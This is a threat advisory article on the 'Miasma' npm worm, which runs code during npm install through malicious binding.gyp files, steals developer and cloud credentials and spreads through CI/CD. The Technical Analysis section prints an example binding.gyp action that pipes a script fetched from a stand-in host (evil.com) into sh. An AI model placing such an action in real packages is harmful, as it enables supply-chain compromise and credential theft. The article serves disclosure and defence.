# "Miasma" Worm Spreads Through npm Using Novel "Phantom Gyp" Evasion Technique

**Severity:** critical | **Category:** Supply Chain Attack,Malware,Threat Actor | **Updated:** 2026-07-22 | **Reading time:** 6 min

A sophisticated, self-propagating worm named 'Miasma' is actively spreading through the npm open-source registry, using a novel evasion technique dubbed 'Phantom Gyp.' The attack bypasses typical security checks by abusing 'binding.gyp' files to execute malicious code during the 'npm install' process, rather than using more commonly monitored install scripts. The worm is a credential harvester that targets a wide range of secrets from developer and CI/CD environments, including npm, GitHub, AWS, and GCP, and then uses those credentials to propagate itself further.

## Executive Summary
A highly sophisticated, self-replicating worm known as **Miasma** is actively compromising the **[npm](https://www.npmjs.com/)** open-source ecosystem through a novel supply chain attack. Security researchers from multiple firms, including StepSecurity, Snyk, and **[Microsoft](https://www.microsoft.com/security)**, have detailed the campaign, which uses an evasive technique they've named "Phantom Gyp." Instead of relying on `preinstall` or `postinstall` scripts in `package.json`, the malware executes code via `binding.gyp` files during the `npm install` process. This allows it to bypass many static analysis security tools. The Miasma worm is a potent credential stealer, harvesting secrets from developer environments and CI/CD pipelines, and then using those stolen credentials to publish more infected packages, creating a rapidly spreading infection.

---

## Threat Overview
The Miasma worm represents a significant evolution in **[supply chain attacks](https://en.wikipedia.org/wiki/Software_supply_chain_attack)**. Its self-propagating nature allows it to spread exponentially without direct continuous operator involvement. The attack, attributed in part to a cluster known as **TeamPCP**, leverages the Mini Shai-Hulud worm code released publicly in May 2026.

The attack chain is as follows:
1.  **Initial Compromise**: A developer installs a compromised npm package.
2.  **Evasive Execution**: During the `npm install` command, the `node-gyp` tool processes a malicious `binding.gyp` file within the package. This triggers the execution of a malicious script, a technique that evades security scanners focused on `package.json` scripts.
3.  **Payload Staging**: The initial script downloads the Bun JavaScript runtime to further evade detection tools focused on Node.js behavior, and then executes the main payload.
4.  **Credential Harvesting**: The Miasma payload scrapes the environment for a wide array of secrets, including `npm` tokens, `GitHub` credentials, `AWS`, `GCP`, and `Azure` keys, `HashiCorp Vault` tokens, `Kubernetes` configs, local SSH keys, and browser data.
5.  **Propagation**: The worm uses stolen `npm` tokens to publish new malicious versions of other packages owned by the compromised developer. It also uses stolen `GitHub` credentials to inject malicious steps into the victim's CI/CD workflows (e.g., GitHub Actions) for persistence and further spread.

## Technical Analysis
The core innovation of this attack is the "Phantom Gyp" technique, an abuse of a legitimate build process. The `binding.gyp` file is a JSON-like file used by `node-gyp` to configure how native C++ addons are compiled. Attackers have embedded a command in the `targets` section of this file that is executed by the system's shell during the installation process, a form of **[T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)**.

An example of a malicious `binding.gyp` entry:
```json
{
  "targets": [
    {
      "target_name": "malicious_build",
      "sources": [],
      "actions": [
        {
          "action_name": "run_payload",
          "inputs": [],
          "outputs": [],
          "action": ["sh", "-c", "curl -sL https://evil.com/payload.sh | sh"]
        }
      ]
    }
  ]
}
```
The worm's ability to propagate via CI/CD pipelines is particularly dangerous. By modifying `github/workflows` files, it can compromise the software build process itself, injecting the worm into legitimate software artifacts and potentially spreading it to downstream users and customers. This is a classic example of **[T1199 - Trusted Relationship](https://attack.mitre.org/techniques/T1199/)** abuse.

## Impact Assessment
The Miasma worm poses a critical threat to the software development ecosystem:
-   **Widespread Credential Theft**: The worm can lead to the mass compromise of developer and cloud infrastructure credentials, providing attackers with broad access to sensitive systems.
-   **Rapid, Uncontrolled Spread**: Its worm-like nature means a single compromised developer can trigger a chain reaction, infecting dozens of other packages and developers.
-   **CI/CD Pipeline Poisoning**: Compromising the build process can lead to trojanized software being shipped to customers, turning a developer-focused problem into a widespread customer-facing incident.
-   **Erosion of Trust in Open Source**: Attacks like this undermine trust in the open-source package registries that modern software development relies on.

The scale is significant; one compromised package, `@vapi-ai/server-sdk`, has over 400,000 monthly downloads, illustrating the potential reach of the infection.

## IOCs — Directly from Articles
No specific file hashes, IP addresses, or domains were provided in the source articles.

## Cyber Observables — Hunting Hints
Security teams may want to hunt for the following patterns to detect related activity:

| Type | Value | Description |
|---|---|---|
| File Name | `binding.gyp` | The presence of a `binding.gyp` file in a package that has no legitimate reason to compile native addons is highly suspicious. |
| Process Name | `node-gyp` | Monitor for `node-gyp` processes that spawn unexpected child processes, such as `curl`, `wget`, or shell scripts. |
| Process Name | `bun` | The presence of the Bun runtime (`bun`) in a CI/CD environment or on a developer machine where it is not explicitly used is a strong indicator of this campaign. |
| File Path | `.github/workflows/` | Monitor for unexpected modifications to GitHub Actions workflow files, especially those that add new `run` steps with obfuscated commands. |

## Detection & Response
1.  **Scan for Malicious `binding.gyp`**: Use static analysis tools or custom scripts to scan npm dependencies for `binding.gyp` files containing suspicious `actions` or shell commands.
2.  **Monitor Build Processes**: Instrument CI/CD pipelines to monitor for anomalous behavior during `npm install`. Look for unexpected network connections, file system access outside the project directory, or the execution of unexpected processes (`bun`). This aligns with D3FEND's **[Process Analysis (D3-PA)](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis)**.
3.  **Dependency Tree Analysis**: Use tools like `npm ls` to check for the presence of known compromised packages in your projects' dependency trees.
4.  **Credential Scanning**: Regularly scan code repositories and CI/CD logs for accidentally exposed credentials.

## Mitigation
1.  **Use `--ignore-scripts`**: When running `npm install` in CI/CD pipelines or for simple dependency checks, use the `--ignore-scripts` flag. This will prevent `preinstall`, `postinstall`, and `node-gyp` build scripts from running. Note that this will break packages that legitimately need to compile addons.
2.  **Vet Dependencies**: Before adding a new dependency, scrutinize its health. Check for recent updates, the number of maintainers, and the presence of suspicious files like `binding.gyp`.
3.  **Lock Dependencies**: Use a lockfile (`package-lock.json`) and do not automatically update to the latest versions of packages without review. This prevents a newly compromised version from being pulled into your build.
4.  **Principle of Least Privilege in CI/CD**: Ensure that CI/CD jobs have only the minimum necessary permissions. Use short-lived, scoped access tokens instead of persistent secrets wherever possible. This is a form of D3FEND's **[User Account Permissions (D3-UAP)](https://d3fend.mitre.org/technique/d3f:UserAccountPermissions)**.

**Tags:** Miasma, Phantom Gyp, npm, Supply Chain Attack, Worm, Credential Theft, CI/CD

## Sources
- [Miasma npm Supply Chain Attack: Self-Spreading Worm via Phantom Gyp - StepSecurity](https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm) — StepSecurity (2026-06-03)
- [Miasma Phantom Gyp npm attack: 57 packages, 286 malicious versions hijack CI/CD pipelines via binding.gyp](https://www.chainguard.dev/unchained/chainguard-artifacts-safe-from-miasma-phantom-gyp-npm-attack) — Chainguard (2026-06-05)
- [Node-gyp Supply Chain Compromise - June 2026](https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/) — Snyk (2026-06-04)
- [Miasma: A Worming npm Supply Chain Attack on Red Hat Cloud Services - Upwind Security](https://www.upwind.io/feed/miasma-npm-supply-chain-worm-redhat-credential-harvest) — Upwind Security (2026-06-04)
- [Miasma Supply Chain Attack Spreads Through the Phantom Gyp Worm - SOC Prime](https://socprime.com/active-threats/miasma-supply-chain-attack-spreads-through-the-phantom-gyp-worm/) — SOC Prime (2026-06-05)
- [Preinstall to persistence: Inside the Red Hat npm Miasma credential-stealing campaign | Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/) — Microsoft Security (2026-06-02)

---
Source: https://cyber.netsecops.io/articles/miasma-worm-evolves-with-phantom-gyp-technique-npm-supply-chain-attack/
